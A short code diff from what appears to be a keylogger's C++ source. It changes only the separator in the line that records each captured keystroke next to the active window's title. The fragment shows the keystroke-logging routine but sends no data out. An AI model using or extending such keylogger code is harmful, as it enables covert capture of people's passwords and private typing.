@@ -173,7 +173,7 @@ void Keybd::saveKey(USHORT usVKey) {
 	// 将虚拟键码转换成对应的ASCII
 	::lstrcpyA(szKey, getKeyName(usVKey));
 	// 构造按键记录信息字符串
-	::wsprintfA(szText, TEXT("[%s] %s\r\n"), szTitle, szKey);
+	::wsprintfA(szText, TEXT("[%s]	%s\r\n"), szTitle, szKey);
 
 	// 保存按键信息到类缓冲区
 	for (int i = 0; i < lstrlenA(szText); i++) {
